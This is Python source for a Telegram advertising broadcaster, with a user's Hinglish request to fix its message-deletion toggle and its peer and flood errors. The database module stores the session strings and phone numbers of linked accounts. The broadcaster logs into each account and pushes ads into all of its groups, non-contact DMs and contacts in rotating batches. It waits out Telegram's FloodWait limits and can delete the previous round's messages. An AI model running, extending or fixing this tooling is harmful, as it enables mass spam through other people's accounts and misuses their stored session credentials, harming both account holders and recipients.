def ping():
    """Force a live round-trip. Returns True/False."""
    global _last_ping
    if mongo_client is None:
        return _connect()
    try:
        mongo_client.admin.command("ping")
        _last_ping = time.time()
        return True
    except Exception:
        return _connect()


def is_connected():
    return bool(db_connected and mongo_client is not None)


# ---------------------------------------------------------------- accessors

def get_users_col():          return users_col
def get_ads_config_col():     return ads_config_col
def get_temp_sessions_col():  return temp_sessions_col
def get_broadcast_msgs_col(): return broadcast_msgs_col
def get_ads_logs_col():       return ads_logs_col


def db_status():
    return {
        "connected": is_connected(),
        "has_users_col": users_col is not None,
        "has_config_col": ads_config_col is not None,
        "has_msgs_col": broadcast_msgs_col is not None,
        "uri_configured": bool(MONGODB_URI),
        "db_name": DB_NAME,
    }


# ---------------------------------------------------------------- files

def allowed_file(filename):
    return bool(filename) and "." in filename and \
        filename.rsplit(".", 1)[1].lower() in ALLOWED_EXT


def media_kind(filename):
    if not filename or "." not in filename:
        return None
    ext = filename.rsplit(".", 1)[1].lower()
    if ext in ALLOWED_VIDEO_EXT:
        return "video"
    if ext in ALLOWED_IMAGE_EXT:
        return "photo"
    return None


def media_exists(path):
    """True if the file is reachable at any plausible location."""
    if not path or not isinstance(path, str):
        return False
    base = os.path.basename(path)
    for cand in (path, os.path.join(UPLOAD_FOLDER, base),
                 os.path.join(os.getcwd(), base)):
        try:
            if cand and os.path.isfile(cand):
                return True
        except (OSError, ValueError):
            continue
    return False


def delete_photo_file(path):
    try:
        if path and os.path.isfile(path):
            os.remove(path)
    except OSError as exc:
        warn(f"could not delete {path}: {exc}", source="db")


def escape_text(value):
    return _html.escape(value or "", quote=False)


# ---------------------------------------------------------------- sessions

def save_session_to_db(session_data):
    """Upsert a linked account. A brand new account gets its first ad after
    exactly one interval, then repeats on that interval."""
    if not ensure_db() or users_col is None:
        return False
    try:
        interval = int(get_ads_config().get("interval") or DEFAULT_INTERVAL_SEC)
        interval = max(60, interval)
        now = datetime.now()
        phone = session_data["phone"]
        payload = {
            "session_string": session_data["session_string"],
            "updated_at": now,
            "user_id": session_data["id"],
            "username": session_data.get("username"),
            "first_name": session_data.get("first_name", ""),
            "last_name": session_data.get("last_name", ""),
            "status": "active",
        }

        existing = users_col.find_one({"phone": phone})
        if existing:
            users_col.update_one({"_id": existing["_id"]}, {"$set": payload})
            if not existing.get("next_ad_time"):
                users_col.update_one(
                    {"_id": existing["_id"]},
                    {"$set": {"next_ad_time": now + timedelta(seconds=interval)}},
                )
            info(f"session refreshed for {phone}", source="db")
            return str(existing["_id"])

        payload.update({
            "phone": phone,
            "session_name": session_data.get("session_name"),
            "created_at": now,
            "next_ad_time": now + timedelta(seconds=interval),
            "ads_enabled": True,
            "last_ad_time": None,
            "deliveries": 0,
            "failures": 0,
            "contact_offset": 0,
        })
        result = users_col.insert_one(payload)
        info(f"new session stored for {phone} "
             f"(first ad in {interval // 60} min)", source="db")
        return str(result.inserted_id)

    except (PyMongoError, KeyError, TypeError) as exc:
        error(f"save_session failed: {type(exc).__name__}: {exc}", source="db")
        return False


def backfill_next_ad_time():
    """Anyone missing a schedule becomes due immediately, once."""
    if not ensure_db() or users_col is None:
        return 0
    try:
        r = users_col.update_many(
            {"next_ad_time": {"$in": [None]}, "$or": [{"next_ad_time": {"$exists": False}}]},
            {"$set": {"next_ad_time": datetime.now()}},
        )
        r2 = users_col.update_many(
            {"next_ad_time": None},
            {"$set": {"next_ad_time": datetime.now()}},
        )
        return r.modified_count + r2.modified_count
    except PyMongoError as exc:
        warn(f"backfill failed: {exc}", source="db")
        return 0


def reschedule_all_after_interval_change(interval_sec):
    if not ensure_db() or users_col is None:
        return 0
    try:
        cap = datetime.now() + timedelta(seconds=interval_sec)
        r = users_col.update_many(
            {"next_ad_time": {"$gt": cap}},
            {"$set": {"next_ad_time": cap}},
        )
        # users with no schedule at all should also respect the new cap
        r2 = users_col.update_many(
            {"next_ad_time": None},
            {"$set": {"next_ad_time": cap}},
        )
        return r.modified_count + r2.modified_count
    except PyMongoError as exc:
        warn(f"reschedule failed: {exc}", source="db")
        return 0


def pull_schedule_forward(max_wait_sec=90, new_wait_sec=30):
    """After a content change, pull pending sends forward so the next tick
    picks it up instead of waiting a whole interval."""
    if not ensure_db() or users_col is None:
        return 0
    try:
        cutoff = datetime.now() + timedelta(seconds=max_wait_sec)
        target = datetime.now() + timedelta(seconds=new_wait_sec)
        r = users_col.update_many(
            {"ads_enabled": True, "next_ad_time": {"$gt": cutoff}},
            {"$set": {"next_ad_time": target}},
        )
        return r.modified_count
    except PyMongoError as exc:
        warn(f"pull_schedule_forward failed: {exc}", source="db")
        return 0


def queue_all_now():
    """Make every subscribed user due right now."""
    if not ensure_db() or users_col is None:
        return 0
    try:
        r = users_col.update_many({"ads_enabled": True},
                                  {"$set": {"next_ad_time": datetime.now()}})
        return r.modified_count
    except PyMongoError as exc:
        warn(f"queue_all_now failed: {exc}", source="db")
        return 0


def get_due_users(limit=500):
    if not ensure_db() or users_col is None:
        return []
    try:
        return list(users_col.find({
            "ads_enabled": True,
            "next_ad_time": {"$lte": datetime.now()},
        }).limit(limit))
    except PyMongoError as exc:
        warn(f"get_due_users failed: {exc}", source="db")
        return []


def get_user_by_oid(oid):
    if not ensure_db() or users_col is None:
        return None
    try:
        return users_col.find_one({"_id": oid})
    except PyMongoError:
        return None


def set_user_ads_enabled(oid, enabled):
    if not ensure_db() or users_col is None:
        return False
    try:
        users_col.update_one({"_id": oid}, {"$set": {"ads_enabled": bool(enabled)}})
        return True
    except PyMongoError:
        return False


def set_user_next_ad_time(oid, when):
    if not ensure_db() or users_col is None:
        return False
    try:
        users_col.update_one({"_id": oid}, {"$set": {"next_ad_time": when}})
        return True
    except PyMongoError:
        return False


def mark_user_expired(oid):
    if not ensure_db() or users_col is None:
        return False
    try:
        users_col.update_one({"_id": oid},
                             {"$set": {"ads_enabled": False, "status": "expired"}})
        return True
    except PyMongoError:
        return False


# ---------------------------------------------------------------- counters

def count_users():
    if not ensure_db() or users_col is None:
        return 0
    return _safe(lambda: users_col.count_documents({}), 0, "count_users")


def count_subscribed():
    if not ensure_db() or users_col is None:
        return 0
    return _safe(lambda: users_col.count_documents({"ads_enabled": True}),
                 0, "count_subscribed")


def count_users_missing_session():
    if not ensure_db() or users_col is None:
        return 0
    return _safe(lambda: users_col.count_documents({
        "$or": [{"session_string": {"$exists": False}},
                {"session_string": None},
                {"session_string": ""}],
    }), 0, "count_users_missing_session")


def count_due_now():
    if not ensure_db() or users_col is None:
        return 0
    return _safe(lambda: users_col.count_documents({
        "ads_enabled": True,
        "next_ad_time": {"$lte": datetime.now()},
    }), 0, "count_due_now")


def count_pending_messages():
    if not ensure_db() or broadcast_msgs_col is None:
        return 0
    return _safe(lambda: broadcast_msgs_col.count_documents({}),
                 0, "count_pending_messages")


# ---------------------------------------------------------------- config

def _new_config_doc():
    doc = {
        "updated_at": datetime.now(),
        "ads": [dict(ad) for ad in DEFAULT_ADS],
        "videos": [dict(v) for v in DEFAULT_VIDEOS],
    }
    doc.update(_CFG_DEFAULTS)
    return doc


def get_ads_config():
    if not ensure_db() or ads_config_col is None:
        return _default_config()
    try:
        # Atomic create-and-return: no read-then-write race, and _id stays out
        # of $setOnInsert so there is no field conflict.
        config = ads_config_col.find_one_and_update(
            {"_id": "main_config"},
            {"$setOnInsert": _new_config_doc()},
            upsert=True,
            return_document=ReturnDocument.AFTER,
        )
        if not config:
            return _default_config()

        for key, value in _CFG_DEFAULTS.items():
            config.setdefault(key, value)

        # Coerce types so callers can trust them.
        config["ads_enabled"] = _as_bool(config.get("ads_enabled"), False)
        config["caption_is_html"] = _as_bool(config.get("caption_is_html"), False)
        config["delete_after_round"] = _as_bool(config.get("delete_after_round"), True)
        try:
            config["interval"] = max(60, int(config.get("interval") or DEFAULT_INTERVAL_SEC))
        except (TypeError, ValueError):
            config["interval"] = DEFAULT_INTERVAL_SEC

        ads = config.get("ads")
        if not isinstance(ads, list):
            ads = [dict(a) for a in DEFAULT_ADS]
        config["ads"] = [_normalize_ad(a) for a in ads]

        vids = list(config.get("videos") or [])
        while len(vids) < VIDEO_SLOTS:
            vids.append({"title": f"Video {len(vids) + 1}", "url": ""})
        config["videos"] = vids[:VIDEO_SLOTS]

        if not config.get("media_path") and config.get("photo_path"):
            config["media_path"] = config["photo_path"]
        if not config.get("media_type") and config.get("media_path"):
            config["media_type"] = media_kind(config["media_path"]) or "photo"
        if config.get("media_type") not in ("photo", "video"):
            config["media_type"] = "photo"

        return config

    except PyMongoError as exc:
        warn(f"get_ads_config failed: {exc}", source="db")
        return _default_config()


def update_ads_config(updates):
    """Write config fields and report whether the write actually landed."""
    if not ensure_db() or ads_config_col is None:
        return False
    updates = dict(updates)
    updates.pop("_id", None)
    updates["updated_at"] = datetime.now()
    try:
        with _config_lock:
            result = ads_config_col.update_one(
                {"_id": "main_config"},
                {"$set": updates},
                upsert=True,
            )
        # matched_count == 0 AND no upsert means nothing happened.
        return bool(result.matched_count or result.upserted_id)
    except PyMongoError as exc:
        error(f"update_ads_config failed: {exc}", source="db")
        return False


def inc_ads_config(field, amount=1):
    if not ensure_db() or ads_config_col is None:
        return False
    if (not isinstance(field, str) or not field or field == "_id"
            or field.startswith("$") or "." in field):
        return False
    try:
        ads_config_col.update_one({"_id": "main_config"},
                                  {"$inc": {field: amount}}, upsert=True)
        return True
    except PyMongoError as exc:
        warn(f"inc_ads_config failed: {exc}", source="db")
        return False


def set_delete_after_round(enabled):
    """Atomic, read-back-verified setter for the delete-after-round flag.
    Returns the persisted value, or None on failure."""
    if not update_ads_config({"delete_after_round": bool(enabled)}):
        return None
    return _as_bool((get_ads_config() or {}).get("delete_after_round"), False)


def get_delete_after_round():
    return _as_bool((get_ads_config() or {}).get("delete_after_round"), True)


def mutate_ads(mutator):
    """Atomic read-modify-write of the ads array."""
    with _config_lock:
        config = get_ads_config()
        ads = [_normalize_ad(a) for a in config.get("ads", [])]
        new_ads = mutator(ads)
        if new_ads is None:
            return None
        if update_ads_config({"ads": new_ads}):
            return new_ads
        return None


def active_link_count():
    cfg = get_ads_config()
    n = 0
    for a in cfg.get("ads", []):
        if a.get("enabled", True) and (a.get("url") or "").startswith("http"):
            n += 1
    return n


def reset_ads_config():
    config = get_ads_config()
    old_media = config.get("media_path") or config.get("photo_path")
    success = update_ads_config({
        "ads": [dict(ad) for ad in DEFAULT_ADS],
        "caption": "",
        "caption_is_html": False,
        "media_path": None,
        "media_type": None,
        "photo_path": None,
    })
    return old_media if success else None


# ---------------------------------------------------------------- videos

def get_videos():
    config = get_ads_config()
    vids = config.get("videos") or []
    out = []
    for i in range(VIDEO_SLOTS):
        v = vids[i] if i < len(vids) else {}
        out.append({
            "slot": i + 1,
            "title": (v.get("title") or f"Video {i + 1}").strip(),
            "url": (v.get("url") or "").strip(),
        })
    return out


def update_videos(videos):
    normalized = []
    for i in range(VIDEO_SLOTS):
        v = videos[i] if i < len(videos) else {}
        normalized.append({
            "title": (v.get("title") or f"Video {i + 1}").strip()[:80],
            "url": (v.get("url") or "").strip(),
        })
    return update_ads_config({"videos": normalized})


# ---------------------------------------------------------------- stats

def get_stats():
    empty = {
        "total_users": 0, "active_users": 0, "idle_users": 0,
        "opted_in": 0, "total_deliveries": 0, "total_broadcasts": 0,
        "db_connected": False, "active_sessions": 0, "pending_msgs": 0,
        "online_users": 0, "recent_users": 0,
        "last_broadcast_at": None, "next_broadcast_at": None,
        "broadcast_mode_users": 0, "registered_today": 0,
        "users_without_session": 0, "due_now": 0,
    }
    if not ensure_db() or users_col is None:
        return empty
    try:
        total    = users_col.count_documents({})
        active   = users_col.count_documents({"status": "active"})
        idle     = users_col.count_documents({"status": "idle"})
        opted_in = users_col.count_documents({"ads_enabled": True})

        agg = list(users_col.aggregate([{
            "$group": {
                "_id": None,
                "d": {"$sum": {"$ifNull": ["$deliveries", 0]}},
                "f": {"$sum": {"$ifNull": ["$failures", 0]}},
            }
        }]))
        deliveries = agg[0]["d"] if agg else 0

        yesterday = datetime.now() - timedelta(days=1)
        recent = users_col.count_documents({"created_at": {"$gte": yesterday}})

        last_hour = datetime.now() - timedelta(hours=1)
        online = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})

        pending = (broadcast_msgs_col.count_documents({})
                   if broadcast_msgs_col is not None else 0)

        today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        registered_today = users_col.count_documents({"created_at": {"$gte": today_start}})

        config = get_ads_config()

        return {
            "total_users": total,
            "active_users": active,
            "idle_users": idle,
            "opted_in": opted_in,
            "total_deliveries": deliveries,
            "total_broadcasts": config.get("total_broadcasts", 0),
            "online_users": online,
            "recent_users": recent,
            "pending_msgs": pending,
            "db_connected": db_connected,
            "active_sessions": 0,
            "last_broadcast_at": config.get("last_broadcast_at"),
            "next_broadcast_at": config.get("next_broadcast_at"),
            "broadcast_mode_users": opted_in,
            "registered_today": registered_today,
            "users_without_session": count_users_missing_session(),
            "due_now": count_due_now(),
        }
    except PyMongoError as exc:
        warn(f"get_stats failed: {exc}", source="db")
        return empty


def get_all_users(limit=500):
    if not ensure_db() or users_col is None:
        return []
    try:
        output = []
        cursor = users_col.find().sort("created_at", DESCENDING).limit(limit)
        for user in cursor:
            ca = user.get("created_at")
            la = user.get("last_ad_time")
            na = user.get("next_ad_time")
            output.append({
                "id": str(user.get("_id")),
                "user_id": user.get("user_id"),
                "name": f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(),
                "username": user.get("username") or "N/A",
                "phone": user.get("phone") or "N/A",
                "status": user.get("status", "unknown"),
                "ads_enabled": user.get("ads_enabled", True),
                "has_session": bool(user.get("session_string")),
                "deliveries": user.get("deliveries", 0),
                "failures": user.get("failures", 0),
                "created_at": ca.strftime("%Y-%m-%d %H:%M") if isinstance(ca, datetime) else "N/A",
                "last_ad_time": la.strftime("%Y-%m-%d %H:%M") if isinstance(la, datetime) else "Never",
                "next_ad_time": na.strftime("%Y-%m-%d %H:%M") if isinstance(na, datetime) else "N/A",
            })
        return output
    except PyMongoError as exc:
        warn(f"get_all_users failed: {exc}", source="db")
        return []


def clear_broadcast_messages():
    if not ensure_db() or broadcast_msgs_col is None:
        return 0
    try:
        n = broadcast_msgs_col.count_documents({})
        broadcast_msgs_col.delete_many({})
        return n
    except PyMongoError as exc:
        warn(f"clear_broadcast_messages failed: {exc}", source="db")
        return 0


# ---------------------------------------------------------------- telegram

def send_to_channel(message):
    if not BOT_TOKEN:
        warn("BOT_TOKEN not configured", source="db")
        return False
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": CHANNEL_ID,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
        if response.status_code != 200:
            warn(f"telegram HTTP {response.status_code}", source="db")
            return False
        result = response.json()
        if not result.get("ok"):
            warn(f"telegram API error: {result}", source="db")
        return result.get("ok", False)
    except (requests.RequestException, ValueError) as exc:
        warn(f"telegram channel error: {exc}", source="db")
        return False


init_db()



fix Nexa/broadcaster.py isme delete toggle 1 msg bheje fir previous wala delete kre then next msg, peer errors flood ye sbb bahut aaata fix kro properly working


import asyncio
import os
import threading
import traceback
import uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta

from pyrogram import Client
from pyrogram.errors import (
    FloodWait, BadRequest, UserDeactivated, AuthKeyUnregistered,
    PeerIdInvalid, ChannelInvalid, ChannelPrivate, ChatWriteForbidden,
)

try:
    from pyrogram.enums import ParseMode
except ImportError:
    from pyrogram.types import ParseMode

import Nexa.database as dbmod
from Nexa.logs import info, success, warn, error

from config import (
    API_ID, API_HASH, BROADCAST_WORKERS, TICK_SECONDS,
    CONTACT_LIMIT_PER_ROUND, CONTACT_DM_GAP_SEC, GROUP_DM_GAP_SEC,
    DEFAULT_INTERVAL_SEC, UPLOAD_FOLDER,
)

SKIP_ERRORS = (PeerIdInvalid, ChannelInvalid, ChannelPrivate, ChatWriteForbidden)
WORK_TIMEOUT = 600

_PARSE_STATE = {"html_ok": True, "warned": False}


def _parse_mode():
    return ParseMode.HTML if _PARSE_STATE["html_ok"] else None


def _disable_html(reason):
    _PARSE_STATE["html_ok"] = False
    if not _PARSE_STATE["warned"]:
        _PARSE_STATE["warned"] = True
        warn(f"HTML parse mode unavailable ({reason}) - using plain text")


_MEDIA_WARNED = set()


def _resolve_media(media_path):
    if not media_path:
        return None
    if not isinstance(media_path, str):
        media_path = str(media_path)

    base = os.path.basename(media_path)
    candidates = [
        media_path,
        os.path.join(UPLOAD_FOLDER, base),
        os.path.join(os.getcwd(), base),
        os.path.join(UPLOAD_FOLDER, media_path.lstrip("/\\")),
    ]
    for cand in candidates:
        try:
            if cand and os.path.isfile(cand):
                return os.path.abspath(cand)
        except (OSError, ValueError):
            continue

    if media_path not in _MEDIA_WARNED:
        _MEDIA_WARNED.add(media_path)
        error(
            f"MEDIA MISSING: '{media_path}' not on disk - sending text only. "
            f"Heroku wipes /app/uploads on restart, re-upload it."
        )
    return None


def _chat_type_value(t):
    return getattr(t, "value", t)


def _coerce_chat_id(v):
    if isinstance(v, int):
        return v
    if isinstance(v, str):
        if v in ("me", "self"):
            return "me"
        try:
            return int(v)
        except ValueError:
            return v
    return v


def _build_payload(config):
    base = config.get("caption") or ""
    if not isinstance(base, str):
        base = str(base)
    if not config.get("caption_is_html"):
        base = base.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    link_lines = []
    ads = config.get("ads") or []
    if not isinstance(ads, list):
        ads = []
    for ad in ads:
        if not isinstance(ad, dict) or not ad.get("enabled", True):
            continue
        url = ad.get("url") or ""
        if not isinstance(url, str):
            url = str(url)
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            continue
        text = (ad.get("text") or ad.get("label") or "").strip()
        if not text:
            continue
        safe = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        link_lines.append(f'• <a href="{url}">{safe}</a>')

    caption = base
    if link_lines:
        caption = (caption + "\n\n" + "\n".join(link_lines)).strip()

    media_type = config.get("media_type") or "photo"
    if media_type not in ("photo", "video"):
        media_type = "photo"

    return {
        "caption": caption,
        "media_path": _resolve_media(config.get("media_path") or config.get("photo_path")),
        "media_type": media_type,
        "delete_prev": bool(config.get("delete_after_round")),
    }


class AdsBroadcaster:
    def __init__(self):
        self._running = False
        self._thread = None
        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        self._pool = ThreadPoolExecutor(max_workers=BROADCAST_WORKERS, thread_name_prefix="bc")

    def is_running(self):
        return self._running

    def start(self):
        with self._lock:
            if self._running:
                return False
            self._stop_event.clear()
            self._running = True
            self._thread = threading.Thread(target=self._run, daemon=True)
            self._thread.start()
        success("Broadcaster started")
        return True

    def stop(self):
        with self._lock:
            if not self._running:
                return False
            self._stop_event.set()
            self._running = False
            t = self._thread
        if t:
            t.join(timeout=5)
        dbmod.update_ads_config({"next_broadcast_at": None})
        info("Broadcaster stopped")
        return True

    def run_now(self):
        threading.Thread(target=self._tick_safe, daemon=True).start()
        return True

    def _run(self):
        try:
            n = dbmod.backfill_next_ad_time()
            if n:
                info(f"Scheduled {n} previously unscheduled users")
        except Exception as e:
            error(f"BACKFILL ERROR: {type(e).__name__}: {e}")
            print(traceback.format_exc(), flush=True)

        while not self._stop_event.is_set():
            self._tick_safe()
            self._stop_event.wait(TICK_SECONDS)

    def _tick_safe(self):
        try:
            self._tick()
        except Exception as e:
            error(f"TICK CRASH: {type(e).__name__}: {e}")
            print(traceback.format_exc(), flush=True)

    def _tick(self):
        users_col = dbmod.users_col
        ads_config_col = dbmod.ads_config_col

        if users_col is None or ads_config_col is None:
            warn("tick skipped: database handles not ready")
            return

        config = ads_config_col.find_one({"_id": "main_config"})

        if config is None:
            warn("tick skipped: no config document")
            return

        if not config.get("ads_enabled", False):
            return

        try:
            interval = max(60, int(config.get("interval", DEFAULT_INTERVAL_SEC)))
        except (TypeError, ValueError):
            interval = max(60, int(DEFAULT_INTERVAL_SEC))

        now = datetime.now()

        due = list(
            users_col.find({
                "ads_enabled": True,
                "next_ad_time": {"$lte": now},
            }).limit(500)
        )

        if not due:
            self._refresh_next_broadcast()
            return

        bid = f"round_{now:%Y%m%d_%H%M%S}"

        no_session = [
            user.get("phone", "?")
            for user in due
            if not user.get("session_string")
        ]

        info(f"ROUND {bid}: {len(due)} user(s) due")

        if no_session:
            warn(
                f"{len(no_session)} user(s) have no session_string: "
                f"{', '.join(no_session[:6])}"
                f"{' …' if len(no_session) > 6 else ''}"
            )

        for user in due:
            if self._stop_event.is_set():
                break

            try:
                users_col.update_one(
                    {"_id": user["_id"]},
                    {
                        "$set": {
                            "next_ad_time": now + timedelta(seconds=interval)
                        }
                    },
                )
                self._submit(user, bid)
            except Exception as e:
                error(
                    f"SUBMIT ERROR [{user.get('phone', '?')}]: "
                    f"{type(e).__name__}: {e}"
                )

        try:
            dbmod.inc_ads_config("total_broadcasts", 1)
            dbmod.update_ads_config({"last_broadcast_at": now})
            self._refresh_next_broadcast()
        except Exception as e:
            error(f"SCHEDULER UPDATE ERROR: {type(e).__name__}: {e}")

    def _submit(self, user, bid):
        try:
            future = self._pool.submit(self._send_to_user, user, bid)
            future.add_done_callback(self._worker_done)
        except Exception as e:
            error(f"SUBMIT FAILED: {type(e).__name__}: {e}")

    def _worker_done(self, future):
        try:
            exc = future.exception()
        except Exception as e:
            error(f"FUTURE ERROR: {type(e).__name__}: {e}")
            return

        if exc is not None:
            error(f"WORKER CRASH: {type(exc).__name__}: {exc}")

    def _refresh_next_broadcast(self):
        users_col = dbmod.users_col

        if users_col is None:
            return

        doc = users_col.find_one(
            {
                "ads_enabled": True,
                "next_ad_time": {"$ne": None},
            },
            sort=[("next_ad_time", 1)],
        )

        next_time = doc.get("next_ad_time") if doc is not None else None

        dbmod.update_ads_config({"next_broadcast_at": next_time})

    async def _send_layout(self, client, chat_id, payload):
        caption = payload["caption"] or ""
        media_path = payload["media_path"]
        media_type = payload["media_type"]

        async def _dispatch(parse):
            if media_path:
                if media_type == "video":
                    return await client.send_video(
                        chat_id,
                        video=media_path,
                        caption=caption,
                        parse_mode=parse,
                    )
                return await client.send_photo(
                    chat_id,
                    photo=media_path,
                    caption=caption,
                    parse_mode=parse,
                )
            return await client.send_message(
                chat_id,
                caption or "\u200b",
                parse_mode=parse,
            )

        parse = _parse_mode()
        try:
            msg = await _dispatch(parse)
        except (BadRequest, ValueError) as e:
            low = str(e).lower()
            if parse is not None and ("parse" in low or "entit" in low or "invalid" in low):
                _disable_html(f"{type(e).__name__}: {e}")
                msg = await _dispatch(None)
            else:
                raise
        return msg.id

    async def _delete_user_messages(self, client, uid, phone):
        msgs = dbmod.broadcast_msgs_col
        if msgs is None:
            return
        rows = list(msgs.find({"user_id": uid}))
        ok = 0
        for row in rows:
            try:
                await client.delete_messages(
                    _coerce_chat_id(row["chat_id"]),
                    row["message_id"],
                )
                ok += 1
            except FloodWait as fw:
                await asyncio.sleep(min(int(getattr(fw, "value", 5)), 30))
                try:
                    await client.delete_messages(
                        _coerce_chat_id(row["chat_id"]),
                        row["message_id"],
                    )
                    ok += 1
                except Exception:
                    pass
            except Exception:
                pass
        msgs.delete_many({"user_id": uid})
        if rows:
            info(f"[{phone}] cleared {ok}/{len(rows)} previous message(s)")

    def _send_to_user(self, user, bid):
        phone = user.get("phone", "?")
        try:
            self._send_to_user_inner(user, bid)
        except Exception as e:
            error(f"[{phone}] UNCAUGHT {type(e).__name__}: {e}")
            print(traceback.format_exc(), flush=True)

    def _send_to_user_inner(self, user, bid):
        users_col = dbmod.users_col
        ads_config_col = dbmod.ads_config_col
        msgs_col = dbmod.broadcast_msgs_col

        uid = user.get("user_id")
        phone = user.get("phone", "?")
        ss = user.get("session_string")

        if not ss:
            warn(f"[{phone}] SKIP - no session_string in user doc")
            return

        if ads_config_col is None:
            warn(f"[{phone}] SKIP - database collection unavailable")
            return

        config = ads_config_col.find_one({"_id": "main_config"})
        if not config:
            warn(f"[{phone}] SKIP - no config doc")
            return
        if not config.get("ads_enabled", False):
            warn(f"[{phone}] SKIP - broadcast disabled")
            return

        payload = _build_payload(config)
        info(
            f"[{phone}] start | media={'yes' if payload['media_path'] else 'no'} "
            f"| caption={len(payload['caption'])}ch"
        )

        sent = []
        delivered = {"n": 0}

        async def work():
            c = Client(
                name=f"bc_{uid}_{uuid.uuid4().hex[:8]}",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=ss,
                in_memory=True,
                no_updates=True,
            )
            try:
                await c.connect()
                me = await c.get_me()
                if not me:
                    raise AuthKeyUnregistered("bad session")
                c.me = me

                if payload["delete_prev"]:
                    await self._delete_user_messages(c, uid, phone)

                try:
                    sent.append(("me", await self._send_layout(c, "me", payload)))
                    delivered["n"] += 1
                    success(f"[{phone}] self delivered")
                except FloodWait as fw:
                    wait = min(int(getattr(fw, "value", 5)), 30)
                    warn(f"[{phone}] FloodWait {wait}s on self, retrying")
                    await asyncio.sleep(wait)
                    try:
                        sent.append(("me", await self._send_layout(c, "me", payload)))
                        delivered["n"] += 1
                        success(f"[{phone}] self delivered after wait")
                    except Exception as e:
                        error(f"[{phone}] self FAIL: {type(e).__name__}: {e}")
                except SKIP_ERRORS as e:
                    warn(f"[{phone}] self skipped: {type(e).__name__}")
                except Exception as e:
                    error(f"[{phone}] self FAIL: {type(e).__name__}: {e}")

                try:
                    contacts = await c.get_contacts() or []
                    contacts = [
                        x for x in contacts
                        if x is not None
                        and not getattr(x, "is_bot", False)
                        and not getattr(x, "is_deleted", False)
                    ]
                except Exception as e:
                    error(f"[{phone}] get_contacts FAIL: {type(e).__name__}: {e}")
                    contacts = []
                contact_ids = {x.id for x in contacts}

                try:
                    dialogs = [d async for d in c.get_dialogs()]
                except Exception as e:
                    error(f"[{phone}] get_dialogs FAIL: {type(e).__name__}: {e}")
                    dialogs = []

                try:
                    n = 0
                    for d in dialogs:
                        if self._stop_event.is_set():
                            break
                        if not d or not d.chat:
                            continue
                        if _chat_type_value(d.chat.type) not in ("group", "supergroup"):
                            continue
                        try:
                            sent.append(
                                (d.chat.id, await self._send_layout(c, d.chat.id, payload))
                            )
                            n += 1
                            await asyncio.sleep(GROUP_DM_GAP_SEC)
                        except FloodWait as fw:
                            await asyncio.sleep(min(int(getattr(fw, "value", 5)), 30))
                        except SKIP_ERRORS:
                            continue
                        except Exception as e:
                            warn(f"[{phone}] group {d.chat.id}: {type(e).__name__}")
                    delivered["n"] += n
                    info(f"[{phone}] {n} group(s) delivered")
                except Exception as e:
                    error(f"[{phone}] groups FAIL: {type(e).__name__}: {e}")

                try:
                    dm_dialogs = [
                        d for d in dialogs
                        if d and d.chat
                        and _chat_type_value(d.chat.type) == "private"
                        and d.chat.id != me.id
                        and d.chat.id not in contact_ids
                        and not getattr(d.chat, "is_bot", False)
                    ]
                    if dm_dialogs:
                        offset = int(user.get("dm_offset") or 0) % len(dm_dialogs)
                        rotated = dm_dialogs[offset:] + dm_dialogs[:offset]
                        batch = rotated[:CONTACT_LIMIT_PER_ROUND]
                        n = 0
                        for d in batch:
                            if self._stop_event.is_set():
                                break
                            try:
                                sent.append(
                                    (d.chat.id, await self._send_layout(c, d.chat.id, payload))
                                )
                                n += 1
                                await asyncio.sleep(CONTACT_DM_GAP_SEC)
                            except FloodWait as fw:
                                await asyncio.sleep(min(int(getattr(fw, "value", 5)), 30))
                            except SKIP_ERRORS:
                                continue
                            except Exception as e:
                                warn(f"[{phone}] dm {d.chat.id}: {type(e).__name__}")
                        delivered["n"] += n
                        new_offset = (offset + len(batch)) % len(dm_dialogs)
                        users_col.update_one(
                            {"_id": user["_id"]},
                            {"$set": {"dm_offset": new_offset}},
                        )
                        info(
                            f"[{phone}] {n} dm(s) delivered "
                            f"(window {offset}->{new_offset} of {len(dm_dialogs)})"
                        )
                except Exception as e:
                    error(f"[{phone}] dms FAIL: {type(e).__name__}: {e}")

                try:
                    if contacts:
                        offset = int(user.get("contact_offset") or 0) % len(contacts)
                        rotated = contacts[offset:] + contacts[:offset]
                        batch = rotated[:CONTACT_LIMIT_PER_ROUND]
                        n = 0
                        for contact in batch:
                            if self._stop_event.is_set():
                                break
                            try:
                                sent.append(
                                    (contact.id, await self._send_layout(c, contact.id, payload))
                                )
                                n += 1
                                await asyncio.sleep(CONTACT_DM_GAP_SEC)
                            except FloodWait as fw:
                                await asyncio.sleep(min(int(getattr(fw, "value", 5)), 30))
                            except SKIP_ERRORS:
                                continue
                            except Exception as e:
                                warn(f"[{phone}] contact {contact.id}: {type(e).__name__}")
                        delivered["n"] += n
                        new_offset = (offset + len(batch)) % len(contacts)
                        users_col.update_one(
                            {"_id": user["_id"]},
                            {"$set": {"contact_offset": new_offset}},
                        )
                        info(
                            f"[{phone}] {n} contact(s) delivered "
                            f"(window {offset}->{new_offset} of {len(contacts)})"
                        )
                except Exception as e:
                    error(f"[{phone}] contacts FAIL: {type(e).__name__}: {e}")

                if sent:
                    users_col.update_one(
                        {"_id": user["_id"]},
                        {
                            "$set": {
                                "last_ad_time": datetime.now(),
                                "last_broadcast_id": bid,
                            },
                            "$inc": {"deliveries": 1},
                        },
                    )
                    success(f"[{phone}] FINISHED - {delivered['n']} chat(s)")
                else:
                    users_col.update_one(
                        {"_id": user["_id"]},
                        {"$inc": {"failures": 1}},
                    )
                    error(f"[{phone}] FINISHED with 0 deliveries")
            finally:
                try:
                    await c.disconnect()
                except Exception:
                    pass

        loop = asyncio.new_event_loop()
        try:
            asyncio.set_event_loop(loop)
            loop.run_until_complete(asyncio.wait_for(work(), timeout=WORK_TIMEOUT))
        except asyncio.TimeoutError:
            error(f"[{phone}] TIMEOUT after {WORK_TIMEOUT}s")
